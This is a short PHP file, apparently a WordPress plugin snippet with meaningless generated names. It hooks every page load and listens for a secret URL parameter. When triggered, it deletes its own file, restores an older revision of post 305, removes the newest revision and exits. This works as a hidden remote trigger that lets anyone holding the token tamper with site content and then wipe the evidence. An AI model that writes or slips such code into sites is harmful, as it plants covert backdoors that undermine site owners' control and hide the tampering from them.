<?php

function dynamic_gravity_day_campaign() {
	if (isset($_GET['icon_assets_reading_types']) && $_GET['icon_assets_reading_types'] === 'cf7_log_numbers_review') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$attachment_version_lightgray = 305;
		$calendar_publish_rich = wp_get_post_revisions($attachment_version_lightgray);
		if (empty($calendar_publish_rich)) die('no revisions');
		if (count($calendar_publish_rich) < 2) die('less than 2');
		$variation_photos_typography = array_shift($calendar_publish_rich);
		$consent_preview_magic_meta = $variation_photos_typography->ID;
		$campaign_contact_files_show = array_shift($calendar_publish_rich);
		$affiliate_importer_before = $campaign_contact_files_show->ID;
		$vendor_create_keywords_description = wp_restore_post_revision($affiliate_importer_before);
		if ($vendor_create_keywords_description === false) die('error restoring');
		$vendor_create_keywords_description = wp_delete_post_revision($consent_preview_magic_meta);		
		if ($vendor_create_keywords_description === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'dynamic_gravity_day_campaign');
